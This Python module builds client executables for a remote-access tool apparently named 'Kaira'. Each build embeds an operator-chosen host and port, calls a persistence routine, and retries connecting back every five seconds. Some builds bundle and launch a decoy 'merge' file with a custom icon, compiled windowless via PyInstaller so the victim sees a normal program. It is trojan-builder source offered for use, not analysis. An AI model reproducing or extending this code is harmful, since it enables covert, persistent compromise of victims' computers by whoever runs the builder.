# A module for converting executable file automation.

import subprocess
from shutil import copyfile, rmtree
import os
from warnings import filterwarnings

filterwarnings("ignore")


def build_with_merge_and_icon(host, port, merge_file, icon, name): # Opens 'kaira_client_build_1.py' and writes kaira_client_build.py
# content with merge function content(client_code).Then builds this file with icon and copies to /builds directory.
    client_code = f"""


def open_merge_file():
    merge_file = _MEIPASS + "\\\{merge_file}"
    subprocess.Popen(merge_file, shell=True)

host = "{host}"
port = {port}


def try_kaira():
    while True:
        sleep(5)
        try:
            kaira = Kaira_Client()
            kaira.core()
        except:
            try_kaira()

get_persistence()
open_merge_file() 
try_kaira()
"""
    with open("modules\\kaira_client_build.py", "r") as file:
        client_content = file.read()

    client_content = client_content + client_code
    with open("kaira_client_build_1.py", "a") as file:
        file.write(client_content)

    pyinstaller_command = f"pyinstaller --onefile --noconsole --icon {icon} --add-data {merge_file};. -w kaira_client_build_1.py"
    subprocess.call(pyinstaller_command, shell=True)
    executable_path = f"builds\\{name}"
    copyfile("dist\\kaira_client_build_1.exe", executable_path)
    os.remove("kaira_client_build_1.py")
    os.remove("kaira_client_build_1.spec")
    rmtree("dist")
    rmtree("build")

def build_with_merge(host, port, merge_file, name): # Same with build_with_merge_and_icon, without icon file.
    client_code = f"""


def open_merge_file():
    merge_file = _MEIPASS + "\\\{merge_file}"
    subprocess.Popen(merge_file, shell=True)

host = "{host}"
port = {port}


def try_kaira():
    while True:
        sleep(5)
        try:
            kaira = Kaira_Client()
            kaira.core()
        except:
            try_kaira()


get_persistence()
open_merge_file() 
try_kaira()
"""
    
    with open("modules\\kaira_client_build.py", "r") as file:
        client_content = file.read()

    client_content = client_content + client_code
    with open("kaira_client_build_1.py", "a") as file:
        file.write(client_content)

    pyinstaller_command = f"pyinstaller --onefile --noconsole --add-data {merge_file};. -w kaira_client_build_1.py"
    subprocess.call(pyinstaller_command, shell=True)
    executable_path = f"builds\\{name}"
    copyfile("dist\\kaira_client_build_1.exe", executable_path)
    os.remove("kaira_client_build_1.py")
    os.remove("kaira_client_build_1.spec")
    rmtree("dist")
    rmtree("build")

def build_with_icon(host, port, icon, name): # Same with build_with_merge_and_icon, without merge file function.
    client_code = f"""


host = "{host}"
port = {port}


def try_kaira():
    while True:
        sleep(5)
        try:
            kaira = Kaira_Client()
            kaira.core()
        except:
            try_kaira()


get_persistence()
try_kaira()
"""
    
    with open("modules\\kaira_client_build.py", "r") as file:
        client_content = file.read()

    client_content = client_content + client_code
    with open("kaira_client_build_1.py", "a") as file:
        file.write(client_content)

    pyinstaller_command = f"pyinstaller --onefile --noconsole --icon {icon} -w kaira_client_build_1.py"
    subprocess.call(pyinstaller_command, shell=True)
    executable_path = f"builds\\{name}"
    copyfile("dist\\kaira_client_build_1.exe", executable_path)
    os.remove("kaira_client_build_1.py")
    os.remove("kaira_client_build_1.spec")
    rmtree("dist")
    rmtree("build")


def default_build(host, port, name): # Builds without any icon or any merge file.Same logic with previous functions.
    client_code = f"""

    
host = "{host}"
port = {port}


def try_kaira():
    while True:
        sleep(5)
        try:
            kaira = Kaira_Client()
            kaira.core()
        except:
            try_kaira()


get_persistence()
try_kaira()
"""
    
    with open("modules\\kaira_client_build.py", "r") as file:
        client_content = file.read()

    client_content = client_content + client_code
    with open("kaira_client_build_1.py", "a") as file:
        file.write(client_content)

    pyinstaller_command = f"pyinstaller --onefile --noconsole -w kaira_client_build_1.py"
    subprocess.call(pyinstaller_command, shell=True)
    executable_path = f"builds\\{name}"
    copyfile("dist\\kaira_client_build_1.exe", executable_path)
    os.remove("kaira_client_build_1.py")
    os.remove("kaira_client_build_1.spec")
    rmtree("dist")
    rmtree("build")
     
    
